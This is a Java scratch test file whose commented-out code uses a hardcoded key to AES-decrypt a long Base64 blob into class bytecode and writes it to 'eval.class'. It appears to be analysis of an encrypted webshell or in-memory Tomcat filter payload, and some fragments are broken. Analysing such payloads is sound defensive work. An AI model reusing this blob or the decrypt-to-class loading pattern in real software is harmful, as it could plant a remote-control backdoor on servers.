package test;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.lang.ref.Reference;
import java.lang.reflect.Field;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

public class Ttest {
    private static Object DataInputStream;

    public static void main(String[] args) throws Exception{
//        org.apache.catalina.core.ApplicationFilterConfig

//        String key = "8104d0a89bac46b8";
//        String text = "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";
//        byte[] ciphertext =Base64.getDecoder().decode(text);
//        Cipher c=Cipher.getInstance("AES");
//        c.init(2,new SecretKeySpec(key.getBytes(),"AES"));
//        byte [] classdata = c.doFinal(ciphertext);
//        System.out.println("还原出来的字节码为："+new String(classdata));
//        FileOutputStream fos = new FileOutputStream(new File("eval.class"));
//        fos.write(classdata);
//        System.out.println("eval文件写出成功");
//
//        String he ="xx";
//        if (DataInputStream  instanceof Field) {
//            System.out.println("xxx");
//        }

//        String stoCtext= "30\n" +
//                "3X..S[\n" +
//                "...-Qux..2...'S..~.[.A.C..M|.H.U...q..kT.\n" +
//                "0";
//        Cipher c1=Cipher.getInstance("AES");
//        c.init(2,new SecretKeySpec(key.getBytes(),"AES"));
//        byte [] classdata1 = c.doFinal(stoCtext.getBytes());
//        System.out.println(new String(classdata1));
//        Reference reference
//        ClassLoader
    }
}